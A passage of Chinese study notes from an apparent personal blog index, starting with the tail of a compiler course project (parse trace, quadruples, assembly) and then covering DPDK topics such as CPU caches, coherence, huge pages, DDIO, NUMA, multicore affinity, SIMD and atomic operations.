24 25 26 27 28 29 30 31 32 33 34 35 36 37  第1步是移进操作\t状态栈为：[1, 5]\t符号栈为：[#, #include] \u0026lt; 第2步是移进操作\t状态栈为：[1, 5, 15]\t符号栈为：[#, #include, \u0026lt;] stdio.h 第3步是移进操作\t状态栈为：[1, 5, 15, 21]\t符号栈为：[#, #include, \u0026lt;, stdio.h] \u0026gt; 第4步是规约操作\t状态栈为：[1, 5, 15, 19]\t符号栈为：[#, #include, \u0026lt;, L]\t产生式为：L -\u0026gt; stdio.h [] 第5步是移进操作\t状态栈为：[1, 5, 15, 19, 27]\t符号栈为：[#, #include, \u0026lt;, L, \u0026gt;] void 第6步是规约操作\t状态栈为：[1, 4]\t符号栈为：[#, B1]\t产生式为：B1 -\u0026gt; #include \u0026lt; L \u0026gt; [] 第7步是规约操作\t状态栈为：[1, 3]\t符号栈为：[#, B]\t产生式为：B -\u0026gt; B1 [] 第8步是移进操作\t状态栈为：[1, 3, 9]\t符号栈为：[#, B, void] id 第9步是规约操作\t状态栈为：[1, 3, 8]\t符号栈为：[#, B, C]\t产生式为：C -\u0026gt; void [] 第10步是移进操作\t状态栈为：[1, 3, 8, 18]\t符号栈为：[#, B, C, id] ( 第11步是规约操作\t状态栈为：[1, 3, 8, 17]\t符号栈为：[#, B, C, D]\t产生式为：D -\u0026gt; id [] 第12步是移进操作\t状态栈为：[1, 3, 8, 17, 25]\t符号栈为：[#, B, C, D, (] ) 第13步是规约操作\t状态栈为：[1, 3, 8, 17, 25, 28]\t符号栈为：[#, B, C, D, (, G]\t产生式为：G -\u0026gt; ε [] 第14步是移进操作\t状态栈为：[1, 3, 8, 17, 25, 28, 41]\t符号栈为：[#, B, C, D, (, G, )] { 第15步是移进操作\t状态栈为：[1, 3, 8, 17, 25, 28, 41, 56]\t符号栈为：[#, B, C, D, (, G, ), {] int 第16步是移进操作\t状态栈为：[1, 3, 8, 17, 25, 28, 41, 56, 86]\t符号栈为：[#, B, C, D, (, G, ), {, int] id 第17步是规约操作\t状态栈为：[1, 3, 8, 17, 25, 28, 41, 56, 82]\t符号栈为：[#, B, C, D, (, G, ), {, I]\t产生式为：I -\u0026gt; int [] 第18步是移进操作\t状态栈为：[1, 3, 8, 17, 25, 28, 41, 56, 82, 94]\t符号栈为：[#, B, C, D, (, G, ), {, I, id] = ...   Semantics.java 语义分析代码\nout.txt 四元组\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  1 (=,bgs,/,w) 2 (=,adb,/,z) 3 (=,0,/,i) 4 (=,0,/,max) 5 (=,1,/,a[0]) 6 (=,4,/,a[1]) 7 (=,6,/,a[2]) 8 (=,2,/,a[3]) 9 (=,8,/,a[4]) 10 (=,9,/,a[5]) 11 (j\u0026lt;,i,6,13) 12 (j,/,/,19) 13 (j\u0026lt;,max,a[i],15) 14 (j,/,/,16) 15 (=,a[i],/,max) 16 (+,i,1,T1) 17 (=,T1,/,i) 18 (j,/,/,11) w int26 z int26 bgs int26 adb int26   Complie.java\n产生汇编语言\n1 2 3 4 5 6 7 8 9 10 11 12 13  1 mov ax,0 2 mov i,ax 3 mov ax,i 4 mov bx,6 5 cmp ax,bx 6 jl 8 7 jmp 14 8 mov ax,i 9 add ax,1 10 mov T1,ax 11 mov ax,T1 12 mov i,ax 13 jmp 3   ","permalink":"https://kevinerr.github.io/posts/read/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/","summary":"此项目为GXU编译原理课设，适合低要求，混及格同学，内涵完整代码(1k行+)、文件和论文(1w字+) 运行环境:eclipse 词法模块内容 （1","title":"编译原理"},{"content":"第2章 Cache和内存 2.1 存储系统简介 本章会讨论Cache和内存\n2.21 系统架构的演进 北桥也称为主桥（Host Bridge），主要用来处理高速信号，通常负 责与处理器的联系。南桥也称为IO桥（IO bridge），负责I/O总线之间的通信，比如PCI总线、SATA、USB等，可 以连接光驱、硬盘、键盘灯设备交换数据。在这种系统中，所有的数据 交换都需要通过北桥：\n1）处理器访问内存需要通过北桥。\n2）处理器访问所有的外设都需要通过北桥。\n3）处理器之间的数据交换也需要通过北桥。\n4）挂在南桥的所有设备访问内存也需要通过北桥\n为了改善对内存的访问瓶颈，出现了另外一种系统设计，内存控制 器并没有被集成在北桥中，而是被单独隔离出来以协调北桥与某个相应 的内存之间的交互，如图2-2所示。这样的话，北桥可以和多个内存相 连。这种架构增加了内存的访问带宽，缓解了不同设备对 同一内存访问的拥塞问题，但是却没有改进单一北桥芯片的瓶颈的问 题。\n的NUMA（Non-Uniform Memory Architecture，非一致性内存架构）系统。\n2.1.2 内存子系统 为了了解内存子系统，首先需要解释一下和内存相关的常用用语。\n1）RAM（Random Access Memory）：随机访问存储器\n2）SRAM（Static RAM）：静态随机访问存储器\n3）DRAM（Dynamic RAM）：动态随机访问存储器。\n4）SDRAM（Synchronous DRAM）：同步动态随机访问存储器。\n5）DDR（Double Data Rate SDRAM）：双数据速率SDRAM。\n6）DDR2：第二代DDR。\n7）DDR3：第三代DDR。\n8）DDR4：第四代DDR。\n2.2 Cache系统简介 Cache的概念，其目的就是为 了匹配处理器和内存之间存在的巨大的速度鸿沟。\n2.2.1 Cache的种类 一级Cache，一般分为数据Cache和指令Cache，数据Cache用来存储 数据，而指令Cache用于存放指令。这种Cache速度最快，一般处理器只 需要3~5个指令周期就能访问到数据，因此成本高，容量小，一般都只 有几十KB。在多核处理器内部，每个处理器核心都拥有仅属于自己的 一级Cache。\n二级Cache，和一级Cache分为数据Cache和指令Cache不同，数据和 指令都无差别地存放在一起。速度相比一级Cache慢一些，处理器大约 需要十几个处理器周期才能访问到数据，容量也相对来说大一些，一般 有几百KB到几MB不等。在多核处理器内部，每个处理器核心都拥有仅 属于自己的二级Cache\n三级Cache，速度更慢，处理器需要几十个处理器周期才能访问到 数据，容量更大，一般都有几MB到几十个MB。在多核处理器内部，三 级Cache由所有的核心所共有。这样的共享方式，其实也带来一个问 题，有的处理器可能会极大地占用三级Cache，导致其他处理器只能占 用极小的容量，从而导致Cache不命中，性能下降。因此，英特尔公司 推出了Intel® CAT技术，确保有一个公平，或者说软件可配置的算法来 控制每个核心可以用到的Cache大小。\n2.2.2 TLB Cache 直接访问物理地址不安全，虚拟地址和分 段分页技术被提出来用来保护脆弱的软件系统。。软件使用虚拟地址访问 内存，而处理器负责虚拟地址到物理地址的映射工作。为了完成映射工 作，处理器采用多级页表来进行多次查找最终找到真正的物理地址\nTLB（Translation Look-aside Buffer）Cache应运而生，专门 用于缓存内存中的页表项。。TLB一般都采用相连存储器或者按内容访问 存储器（CAM，Content Addressable Memory）。\n2.3 Cache地址映射和变换 如何把 内存中的内容存放到Cache中去呢？这就需要一个映射算法和一个分块 机制。\n分块机制就是说，Cache和内存以块为单位进行数据交换，块的大 小通常以在内存的一个存储周期中能够访问到的数据长度为限。当今主 流块的大小都是64字节，因此一个Cache line就是指64个字节大小的数 据块。\n假设要找0000001110这个地址，根据空间局部性，之后很有可能用到旁边得地址，所以把块号为00000011这个块存入cache中\n跟据Cache和内存之间的映射关系的不同，Cache可以分为三类：第 一类是全关联型Cache（full associative cache），第二类是直接关联型 Cache（direct mapped cache），第三类是组关联型Cache（N-ways associative cache）。\n2.3.1 全关联型Cache https://www.bilibili.com/video/BV1h3411h7kV?spm_id_from=333.337.search-card.all.click\n全关联型Cache，块的冲突最小（没有冲突）， Cache的利用率也高，但是需要一个访问速度很快的相联存储器。随着 Cache容量的增加，其电路设计变得十分复杂，因此只有容量很小的 Cache才会设计成全关联型的（如一些英特尔处理器中的TLB Cache）。\n2.3.2 直接关联型Cache 直接关联是一种很“死”的映射方法，当映射到同一个 Cache块的多个内存块同时需要缓存在Cache中时，只有一个内存块能够 缓存，其他块需要被“淘汰”掉。因此，直接关联型命中率是最低的，但 是其实现方式最为简单，匹配速度也最快。\n2.3.3 组关联型Cache 直接关联型Cache和全关联型Cache只是组关联型Cache的 特殊情况，当组内Cache Line数目为1时，即为直接关联型Cache。而当 组内Cache Line数目和Cache大小相等时，即整个Cache只有一个组，这 成为全关联型Cache。或每一个块一个组，就变成直接关联型Cache\n2.4 Cache的写策略 “写”操作必须在确认是命中后才可进行\nØ写直达法（也称为存直达法）\n执行“写”操作时，不仅写入Cache，而且也写入下一级存储器。\nØ写回法（也称为拷回法）\n执行“写”操作时，只写入Cache。仅当Cache中相应的块被替换时，才写回主存。(设置“修改位”)\nØ按写分配(写时取)\n　写不命中时，先把所写单元所在的块调入Cache\n再行写入。\nØ不按写分配(绕写法)\n　写不命中时，直接写入下一级存储器而不调块。\n7.写策略与调块\nØ写回法 ── 按写分配\nØ写直达法 ── 不按写分配\n2.5 Cache预取 2.5.1 Cache的预取原理 Cache之所以能够提高系统性能，主要是程序执行存在局部性现 象，即时间局部性和空间局部性。\n1）时间局部性：是指程序即将用到的指令/数据可能就是目前正在 使用的指令/数据。因此，当前用到的指令/数据在使用完毕之后可以暂 时存放在Cache中，可以在将来的时候再被处理器用到。一个简单的例 子就是一个循环语句的指令，当循环终止的条件满足之前，处理器需要 反复执行循环语句中的指令。\n2）空间局部性：是指程序即将用到的指令/数据可能与目前正在使 用的指令/数据在空间上相邻或者相近。因此，在处理器处理当前指令/ 数据时，可以从内存中把相邻区域的指令/数据读取到Cache中，这样， 当处理器需要处理相邻内存区域的指令/数据时，可以直接从Cache中读 取，节省访问内存的时间。一个简单的例子就是一个需要顺序处理的数 组。\n2.5.2 NetBurst架构处理器上的预取 1.一级数据Cache的预取单元\n1）数据Cache预取单元：也叫基于流的预取单元（Streaming prefetcher）。当程序以地址递增的方式访问数据时，该单元会被激活， 自动预取下一个Cache行的数据。\n2）基于指令寄存器（Instruction Pointer，IP）的预取单元：该单元 会监测指令寄存器的读取（Load）指令，当该单元发现读取数据块的大 小总是相对固定的情况下，会自动预取下一块数据。假设当前读取地址 是0xA000，读取数据块大小为256个字节，那地址是0xA100-0xA200的 数据就会自动被预取到一级数据Cache中。该预取单元能够追踪的最大 数据块大小是2K字节。\n当程序需要多次访问某种大的数据结构，并且访问的顺序是有规律 的，硬件单元能够捕捉到这种规律，进而能够提前预取需要处理的数 据，那么就能提高程序的执行效率；当访问的顺序没有规律，或者硬件 不能捕捉这种规律，这种预取不但会降低程序的性能，而且会占用更多 的带宽，浪费一级Cache有限的空间；甚至在某些极端情况下，程序本 身就占用了很多一级数据Cache的空间，而预取单元为了预取它认为程 序需要的数据，不适当地淘汰了程序本身存放在一级Cache的数据，从 而导致程序的性能严重下降。\n2.硬件预取所遵循的原则\n1）只有连续两次Cache不命中才能激活预取机制。并且，这两次不 命中的内存地址的位置偏差不能超过256或者512字节（NetBurst架构的 不同处理器定义的阈值不一样），否则也不会激活预取。这样做的目的 是因为预取也会有开销，会占用内部总线的带宽，当程序执行没有规律 时，盲目预取只会带来更多的开销，并且并不一定能够提高程序执行的 效率。\n2）一个4K字节的页（Page）内，只定义一条流（Stream，可以是 指令，也可以是数据）。因为处理器同时能够追踪的流是有限的。 3）能够同时、独立地追踪8条流。每条流必须在一个4K字节的页 内。\n4）对4K字节的边界之外不进行预取。也就是说，预取只会在一个 物理页（4K字节）内发生。这和一级数据Cache预取遵循相同的原则。 5）预取的数据存放在二级或者三级Cache中。\n6）对于UC（Strong Uncacheable）和WC（Write Combining）内存 类型不进行预取。\n2.5.3 两个执行效率迥异的程序 1 2 3 4 5 6 7 8 9 10 11 12  程序1: for(int i = 0; i \u0026lt; 1024; i++) { \tfor(int j = 0; j \u0026lt; 1024; j++) { \tarr[i][j] = num++; \t} } 程序2: for(int i = 0; i \u0026lt; 1024; i++) { \tfor(int j = 0; j \u0026lt; 1024; j++) { \tarr[j][i] = num++; \t} }   程序1是按照 数组在内存中的保存方式顺序访问，而程序2则是跳跃式访问。对于程 序1，硬件预取单元能够自动预取接下来需要访问的数据到Cache，节省 访问内存的时间，从而提高程序1的执行效率；对于程序2，硬件不能够 识别数据访问的规律，因而不会预取，从而使程序2总是需要在内存中 读取数据，降低了执行的效率.\n2.5.4 软件预取 硬件预取单元并不一定能够提高程序执行 的效率，有些时候可能会极大地降低执行的效率。因此，一些体系架构 的处理器增加了一些指令，使得软件开发者和编译器能够部分控制 Cache。能够影响Cache的指令很多，本书仅介绍预取相关的指令。\n·DPDK中的预取\n在讨论之前，我们需要了解另外一个和性能相关的话题。DPDK一 个处理器核每秒钟大概能够处理33M个报文，大概每30纳秒需要处理一 个报文，假设处理器的主频是2.7GHz，那么大概每80个处理器时钟周期 就需要处理一个报文。那么，处理报文需要做一些什么事情呢？以下是 一个基本过程。\n可以看出，处理一个报文的过程，需要6次读取内存（见上“内存 读”）。而之前我们讨论过，处理器从一级Cache读取数据需要3~5个时 钟周期，二级是十几个时钟周期，三级是几十个时钟周期，而内存则需 要几百个时钟周期。从性能数据来说，每80个时钟周期就要处理一个报 文。 因此，DPDK必须保证所有需要读取的数据都在Cache中，否则一 旦出现Cache不命中，性能将会严重下降。为了保证这点，DPDK采用 了多种技术来进行优化，预取只是其中的一种。 而从上面的介绍可以看出，控制结构体和数据缓冲区的读取都没有 遵循硬件预取的原则，因此DPDK必须用一些预取指令来提前加载相应 数据。\n2.6 Cache一致性 1）该数据结构或者数据缓冲区的起始地址是Cache Line对齐的吗？ 如果不是，即使该数据区域的大小小于Cache Line，那么也需要占用两 个Cache entry；并且，假设第一个Cache Line前半部属于另外一个数据 结构并且另外一个处理器核正在处理它，那么当两个核都修改了该 Cache Line从而写回各自的一级Cache，准备送到内存时，如何同步数 据？毕竟每个核都只修改了该Cache Line的一部分。\n2）假设该数据结构或者数据缓冲区的起始地址是Cache Line对齐 的，但是有多个核同时对该段内存进行读写，当同时对内存进行写回操 作时，如何解决冲突？\n2.6.1 Cache Line对齐 定义该数据结构或者数据缓冲区时就申明对齐\n2.6.2 Cache一致性问题的由来 对于读，首先是从 内存加载到Cache，最后送到处理器内部的寄存器；对于写，则是从寄 存器送到Cache，最后通过内部总线写回到内存。即多个处理器对某个内存块同时读写，会 引起冲突的问题，这也被称为Cache一致性问题。\n假设只是单核处理器，那么只有一个处理器会对内存进行读 写，Cache也是只有一份，因而不会出现一致性的问题。 2）假设是多核处理器系统，但是Cache是所有处理器共享的，那么 当一个处理器对内存进行修改并且缓存在Cache中时，其他处理器都能 看到这个变化，因而也不会产生一致性的问题。 3）假设是多核处理器系统，每个核心也有独占的Cache，但是 Cache只会采用直写，那么当一个处理器对内存进行修改之后，Cache会 马上将数据写入到内存中，也不会有问题吗？考虑之前我们介绍的一个 例子，线程A把结果写回到内存中，但是线程B只会从独占的Cache中读 取这个变量（因为没人通知它内存的数据产生了变化），因此在这种条 件下还是会有Cache一致性的问题。\nCache一致性问题的根源是因为存在多个处理器独占的 Cache，而不是多个处理器。\n处理器共享Cache，那么就不会有任何问题。但是，这 种解决办法的问题就是太慢了。首先，既然是共享的Cache，势必容量 不能小，那么就是说访问速度相比之前提到的一级、二级Cache，速度 肯定几倍或者十倍以上；其次，每个处理器每个时钟周期内只有一个处 理器才能访问Cache，那么处理器把时间都花在排队上了，这样效率太 低了。\n2.6.3 一致性协议 解决Cache一致性问题的机制有两种：基于目录的协议（Directory\u0002based protocol）和总线窥探协议（Bus snooping protocol）。\n基于目录协议的系统中，需要缓存在Cache的内存块被统一存储在 一个目录表中，目录表统一管理所有的数据，协调一致性问题。该目录 表类似于一个仲裁者，当处理器需要把一个数据从内存中加载到自己独 占的Cache中时，需要向目录表提出申请；当一个内存块被某个处理器 改变之后，目录表负责改变其状态，更新其他处理器的Cache中的备 份，或者使其他处理器的Cache的备份无效。\n总线窥探协议是在1983年被首先提出来，这个协议提出了一个窥探 （snooping）的动作，即对于被处理器独占的Cache中的缓存的内容，该 处理器负责监听总线，如果该内容被本处理器改变，则需要通过总线广 播；反之，如果该内容状态被其他处理器改变，本处理器的Cache从总 线收到了通知，则需要相应改变本地备份的状态。\n基于目录的协议的延迟性较大，但是在拥有很多个处理器的系统 中，它有更好的可扩展性。而总线窥探协议适用于具有广播能力的总线 结构，允许每个处理器能够监听其他处理器对内存的访问，适合小规模 的多核系统\n2.6.4 MESI协议 https://www.bilibili.com/video/BV1fK4y1E7NC?spm_id_from=333.337\n总结：\n当CPU写数据时（M），如果发现操作的变量是共享变量（S），会发出信号通知其他CPU将该变量的缓存行置为无效状态(I)，因此其他CPU需要获取这个变量时，发现自己缓存中缓存改变量的缓存行时无效的那么他会从内存中重新获取，确保一致性\n读取数据时，其他CPU缓存行如果发生修改，要先把修改的数据写入内存\n当修改数据时，其他CPU的该缓存行状态必须全部失效\n2.6.5 DPDK如何保证Cache一致性 数据结构定义。DPDK的应用程序很多情况下都需要多个 核同时来处理事务，因而，对于某些数据结构，我们给每个核都单独定 义一份，这样每个核都只访问属于自己核的备份。以上的数据结构“struct lcore_conf”总是以Cache行对齐，这样就不会 出现该数据结构横跨两个Cache行的问题。而定义的数 组“lcore[RTE_MAX_LCORE]”中RTE_MAX_LCORE指一个系统中最大 核的数量。DPDK中对每个核都进行编号，这样核n就只需要访问 lcore[n]，核m只需要访问lcore[m]，这样就避免了多个核访问同一个结 构体。\n对网络端口的访问。在网络平台中，少不了访问网络设 备，比如网卡。多核情况下，有可能多个核访问同一个网卡的接收队 列/发送队列，也就是在内存中的一段内存结构。这样，也会引起Cache 一致性的问题。那么DPDK是如何解决这个问题的呢？网卡设备一般都具有多队列的能力，也就是说，一 个网卡有多个接收队列和多个访问队列，其他章节会很详细讲到，本节 不再赘述。 DPDK中，如果有多个核可能需要同时访问同一个网卡，那么 DPDK就会为每个核都准备一个单独的接收队列/发送队列。这样，就避 免了竞争，也避免了Cache一致性问题。\n2.7 TLB和大页 2.7.1 逻辑地址到物理地址的转换 2.7.2 TLB 2.7.3 使用大页 从上面的逻辑地址到物理地址的转换我们知道，如果采用常规页 （4KB）并且使TLB总能命中，那么至少需要在TLB表中存放两个表 项，在这种情况下，只要寻址的内容都在该内容页内，那么两个表项就 足够了。如果一个程序使用了512个内容页也就是2MB大小，那么需要 512个页表表项才能保证不会出现TLB不命中的情况。通过上面的介 绍，我们知道TLB大小是很有限的，随着程序的变大或者程序使用内存 的增加，那么势必会增加TLB的使用项，最后导致TLB出现不命中的情 况。那么，在这种情况下，大页的优势就显现出来了。如果采用2MB作 为分页的基本单位，那么只需要一个表项就可以保证不出现TLB不命中 的情况；对于消耗内存以GB（2 30）为单位的大型程序，可以采用1GB 为单位作为分页的基本单位，减少TLB不命中的情况。\n2.7.4 如何激活大页 首先，Linux操作系统采用了基于hugetlbfs的特殊文件系统来加入对 2MB或者1GB的大页面支持。这种采用特殊文件系统形式支持大页面的 方式，使得应用程序可以根据需要灵活地选择虚存页面大小，而不会被 强制使用2MB大页面。 为了使用大页，必须在编译内核的时候激活hugetlbfs。 在激活hugetlbfs之后，还必须在Linux启动之后保留一定数量的内存 作为大页来使用。现在有两种方式来预留内存。 第一种是在Linux命令行指定，这样Linux启动之后内存就已经预 留；第二种方式是在Linux启动之后，可以动态地预留内存作为大页使 用。以下是2MB大页命令行的参数。\n2.8 DDIO 2.8.1 时代背景 Intel® DDIO（Data Direct I/O）的技术。该技术的主要 目的就是让服务器能更快处理网络接口的数据，提高系统整体的吞吐 率，降低延迟，同时减少能源的消耗。\n当一个网络报文送到服务器的网卡时，网卡通过外部总线（比如 PCI总线）把数据和报文描述符送到内存。接着，CPU从内存读取数据 到Cache进而到寄存器。进行处理之后，再写回到Cache，并最终送到内 存中。最后，网卡读取内存数据，经过外部总线送到网卡内部，最终通 过网络接口发送出去。\n可以看出，对于一个数据报文，CPU和网卡需要多次访问内存。而 内存相对CPU来讲是一个非常慢速的部件。CPU需要等待数百个周期才 能拿到数据，在这过程中，CPU什么也做不了。\nDDIO技术是如何改进的呢？这种技术使外部网卡和CPU通过LLC Cache直接交换数据，绕过了内存这个相对慢速的部件。这样，就增加 了CPU处理网络报文的速度（减少了CPU和网卡等待内存的时间），减 小了网络报文在服务器端的处理延迟。这样做也带来了一个问题，因为 网络报文直接存储在LLC Cache中，这大大增加了对其容量的需求，因 而在英特尔的E5处理器系列产品中，把LLC Cache的容量提高到了 20MB。\n2.8.2 网卡的读数据操作 通常来说，为了发送一个数据报文到网络上去，首先是运行在CPU 上的软件分配了一段内存，然后把这段内存读取到CPU内部，更新数 据，并且填充相应的报文描述符（网卡会通过读取描述符了解报文的相 应信息），然后写回到内存中，通知网卡，最终网卡把数据读回到内 部，并且发送到网络上去。\n由于DDIO技术的引入，网卡的读操作减少了访问 内存的次数，因而提高了访问效率，减少了报文转发的延迟。在理想状 况下，NIC和处理器无需访问内存，直接通过访问Cache就可以完成更 新数据，把数据送到NIC内部，进而送到网络上的所有操作。\n2.8.3 网卡的写数据操作 NIC从网络上收到报文后，通过PCI总线把报 文和相应的控制结构体送到预先分配的内存，然后通知相应的驱动程序 或者软件来处理。\nDDIO技术在处理器和外设之间交换数据时，减少 了处理器和外设访问内存的次数，也减少了Cache写回的等待，提高了 系统的吞吐率和数据的交换延迟。\n2.9 NUMA系统 https://zhuanlan.zhihu.com/p/272201846\nNUMA（Non Uniform Memory Access），非一致性内存访问。\nNUMA系统是从SMP（Symmetric Multiple Processing，对称多处理器）系统演化而来。\n1）所有的硬件资源都是共享的。即每个处理器都能访问到任何内 存、外设等。\n2）所有的处理器都是平等的，没有主从关系。\n3）内存是统一结构、统一寻址的（UMA，Uniform Memory Architecture）。\n4）处理器和内存，处理器和处理器都通过一条总线连接起来。\n其结构如图2-14所示： SMP的问题也很明显，因为所有的处理器都通过一条总线连接起 来，因此随着处理器的增加，系统总线成为了系统瓶颈，另外，处理器 和内存之间的通信延迟也较大。为了克服以上的缺点，才应运而生了 NUMA架构，\n1）Per-core memory。一个处理器上有多个核（core），per-core memory是指每个核都有属于自己的内存，即对于经常访问的数据结 构，每个核都有自己的备份。这样做一方面是为了本地内存的需要，另 外一方面也是因为上文提到的Cache一致性的需要，避免多个核访问同 一个Cache行。 2）本地设备本地处理。即用本地的处理器、本地的内存来处理本 地的设备上产生的数据。如果有一个PCI设备在node0上，就用node0上 的核来处理该设备，处理该设备用到的数据结构和数据缓冲区都从 node0上分配。以下是一个分配本地内存的例子\n第3章 并行计算 处理器性能提升主要有两个途径，一个是提高IPC（每个时钟周期 内可以执行的指令条数），另一个是提高处理器主频率。每一代微架构 的调整可以伴随着对IPC的提高，从而提高处理器性能，只是幅度有 限。而提高处理器主频率对于性能的提升作用是明显而直接的。但一味 地提高频率很快会触及频率墙，因为处理器的功耗正比于主频的三次 方。 所以，最终要取得性能提升的进一步突破，还是要回到提高IPC这 个因素。经过处理器厂商的不懈努力，我们发现可以通过提高指令执行 的并行度来提高IPC。而提高并行度主要有两种方法，一种是提高微架 构的指令并行度，另一种是采用多核并发。这一章主要就分享这两种方 法在DPDK中的实践，并在指令并行方法中上进一步引入数据并发的介 绍\n3.1 多核性能和可扩展性 3.1.1 追求性能水平扩展 Amdahl 定律（也叫阿姆达尔定律）的主要思想是：当我们对系统的某个部分加速时，其对系统整体性能的影响取决于该部分的重要性和加速程度。\nAmdahl定律告诉我 们，假设一个任务的工作量不变，多核并行计算理论时延加速上限取决 于那些不能并行处理部分的比例。换句话说，多核并行计算下时延不能 随着核数增加而趋于无限小。该定律明确告诉我们，利用多核处理器提 升固定工作量性能的关键在于降低那些不得不串行部分占整个任务执行 的比例。\n对于DPDK的主要应用领域——数据包处理，多数场景并不是完成 一个固定工作量的任务，更主要关注单位时间内的吞吐量。Gustafson定 律对于在固定工作时间下的推导给予我们更多的指导意义。它指出，多 核并行计算的吞吐率随核数增加而线性扩展，可并行处理部分占整个任 务比重越高，则增长的斜率越大。\n3.1.2 多核处理器 CPU寄存器集合、中断逻 辑（Local APIC）、执行单元和Cache。一个完整的物理核需要拥有这 样的整套资源，提供一个指令执行线程。\n多处理器结构指的是多颗单独封装的CPU通过外部总线连接，构成 的统一计算平台\n超线程（Hyper-Threading）在一个处理器中提供两 个逻辑执行线程，逻辑线程共享流水线、执行单元和缓存。该技术的本 质是复用单处理器中的超标量流水线的多路执行单元，降低多路执行单 元中因指令依赖造成的执行单元闲置。\n3.1.3 亲和性 CPU亲和性（Core affinity）就是一个特定的任务要在某 个给定的CPU上尽量长时间地运行而不被迁移到其他处理器上的倾向 性。这意味着线程可以不在处理器之间频繁迁移。这种状态正是我们所 希望的，因为线程迁移的频率小就意味着产生的负载小。\n1.Linux内核对亲和性的支持\n2.为什么应该使用亲和性\n将线程与CPU绑定，最直观的好处就是提高了CPU Cache的命中 率，从而减少内存访问损耗，提高程序的速度。\n3.线程独占\nDPDK通过把线程绑定到逻辑核的方法来避免跨核任务中的切换开 销，但对于绑定运行的当前逻辑核，仍然可能会有线程切换的发生，若 希望进一步减少其他任务对于某个特定任务的影响，在亲和的基础上更 进一步，可以采取把逻辑核从内核调度系统剥离的方法。 Linux内核提供了启动参数isolcpus。对于有4个CPU的服务器，在启 动的时候加入启动参数isolcpus=2，3。那么系统启动后将不使用CPU3 和CPU4。注意，这里说的不使用不是绝对地不使用，系统启动后仍然 可以通过taskset命令指定哪些程序在这些核心中运行。步骤如下所示。\n3.1.4 DPDK的多线程 DPDK的线程基于pthread接口创建，属于抢占式线程模型，受内核 调度支配。DPDK通过在多核设备上创建多个线程，每个线程绑定到单 独的核上，减少线程调度的开销，以提高性能。 DPDK的线程可以作为控制线程，也可以作为数据线程。在DPDK 的一些示例中，控制线程一般绑定到MASTER核上，接受用户配置，并 传递配置参数给数据线程等；数据线程分布在不同核上处理数据包。\nlcore可以亲和到一个CPU或者一个CPU集 合，使得在运行时调整具体某个CPU承载lcore成为可能。 而另一个方面，多个lcore也可能亲和到同一个核。这里要注意的 是，同一个核上多个可抢占式的任务调度涉及非抢占式的库时，会有一 定限制。这里以非抢占式无锁rte_ring为例： 1）单生产者/单消费者模式，不受影响，可正常使用。 2）多生产者/多消费者模式且pthread调度策略都是SCHED_OTHER 时，可以使用，性能会有所影响。 3）多生产者/多消费者模式且pthread调度策略有SCHED_FIFO或者 SCHED_RR时，建议不使用，会产生死锁。\n3.2 指令并发与数据并行 3.2.1 指令并发 现代多核处理器几乎都采用了超标量的体系结构来提高指令的并发 度，并进一步地允许对无依赖关系的指令乱序执行。这种用空间换时间 的方法，极大提高了IPC，使得一个时钟周期完成多条指令成为可能。\nScheduler下挂了8个Port，这表示每个core每个时钟周期最多可 以派发8条微指令操作。具体到指令的类型，比如Fast LEA，它可以同 时在Port 1和Port 5上派发。换句话说，该指令具有被多发的能力。可以 简单地理解为，该指令先后操作两个没有依赖关系的数据时，两条指令 有可能被处理器同时派发到执行单元执行，由此该指令实际执行的吞吐 率就提升了一倍\n3.2.2 单指令多数据 https://zhuanlan.zhihu.com/p/55327037\nSIMD是Single-Instruction Multiple-Data（单指令多数据）的缩写， 从字面的意思就能理解大致的含义。多数据指以特定宽度为一个数据单 元，多单元数据独立操作。而单指令指对于这样的多单元数据集，一个 指令操作作用到每个数据单元。可以把SIMD理解为向量化的操作方 式。典型SIMD操作如图3-7所示，两组各4个数据单元（X1，X2，X3， X4和Y1，Y2，Y3，Y4）并行操作，相同操作作用在相应的数据单元对 上（X1和Y1，X2和Y2，X3和Y3，X4和Y4），4对计算结果组成最后 的4数据单元数\n实战DPDK DPDK中的memcpy就利用到了SSE/AVX的特点。比较典型的就是 rte_memcpy内存拷贝函数。内存拷贝是一个非常简单的操作，算法上并 无难度，关键在于很好地利用处理器的各种并行特性。当前Intel的处理 器（例如Haswell、Sandy Bridge等）一个指令周期内可以执行两条Load 指令和一条Store指令，并且支持SIMD指令（SSE/AVX）来在一条指令 中处理多个数据，其Cache的带宽也对SIMD指令进行了很好的支持。因 此，在rte_memcpy中，我们使用了平台所支持的最大宽度的Load和Store 指令（Sandy Bridge为128bit，Haswell为256bit）。此外，由于非对齐的 存取操作往往需要花费更多的时钟周期，rte_memcpy优先保证Store指令 存储的地址对齐，利用处理器每个时钟周期可以执行两条Load这个超标 量特性来弥补一部分非对齐Load所带来的性能损失\n3.3 小结 多核采用这种“横向扩展”的方法来提高系统的性能，该架构实现 了“分治法”策略。通过划分任务，线程应用能够充分利用多个执行内 核，并且可以在特定时间内执行更多任务。它的优点是能够充分并且灵 活地分配CPU，使它们的利用率最大化。但是，增加了上下文切换以及 缓存命中率的开销。总之，由于多个核的存在，多核同步问题也是一个 重要部分，由于很难严格做到每个核都不相关，因此引入无锁结构，这 将在以后做更进一步介绍\n第4章 同步互斥机制 DPDK根据多核处理器的特点，遵循资源局部化的原则，解耦数据 的跨核共享，使得性能可以有很好的水平扩展。但当面对实际应用场 景，CPU核间的数据通信、数据同步、临界区保护等都是不得不面对的 问题。如何减少由这些基础组件引入的多核依赖的副作用，也是DPDK 的一个重要的努力方向\n4.1 原子操作 4.1.1 处理器上的原子操作 在单处理器系统（UniProcessor）中，能够在单条指令中完成的操 作都可以认为是“原子操作”，因为中断只能发生于指令之间。这也是某 些CPU指令系统中引入了test_and_set、test_and_clear等指令用于临界资 源互斥的原因。\n在多核CPU的时代，体系中运行着多个独立的CPU，即使是可以在 单个指令中完成的操作也可能会被干扰。典型的例子就是decl指令（递 减指令），它细分为三个过程：“读-\u0026gt;改-\u0026gt;写”，涉及两次内存操作。如 果多个CPU运行的多个进程或线程在同时对同一块内存执行这个指令， 那情况是无法预测的。\n在x86平台上，总的来说，CPU提供三种独立的原子锁机制：原子 保证操作、加LOCK指令前缀和缓存一致性协议。\n4.1.2 Linux内核原子操作 软件级的原子操作实现依赖于硬件原子操作的支持。对于Linux而 言，内核提供了两组原子操作接口：一组是针对整数进行操作；另一组 是针对单独的位进行操作。\n1.原子整数操作 针对整数的原子操作只能处理atomic_t类型的数据。这里没有使用C 